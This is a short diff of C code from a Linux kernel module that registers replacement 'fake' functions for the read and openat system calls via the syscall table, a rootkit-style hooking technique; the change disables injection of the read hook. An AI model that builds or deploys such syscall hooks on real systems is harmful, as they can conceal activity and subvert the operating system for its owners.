@@ -107,7 +107,7 @@ int __init loadMod(void){
 	//increment numTargets, thus obtaining a free index. Then using said index:
 	syscall_names[0] = __NR_read;	//store the syscall name (is macro for index in sys_call_table)
 	totallyReal_syscallPtrs[0] = (void *) &totallyReal_read;	//store the ptr to your fake function
-	toInject[0] = 1;	//set whether or not you want to inject your fake function.
+	toInject[0] = 0;	//set whether or not you want to inject your fake function.
 
 	syscall_names[1] = __NR_openat;
 	totallyReal_syscallPtrs[1] = (void *) &totallyReal_openat;
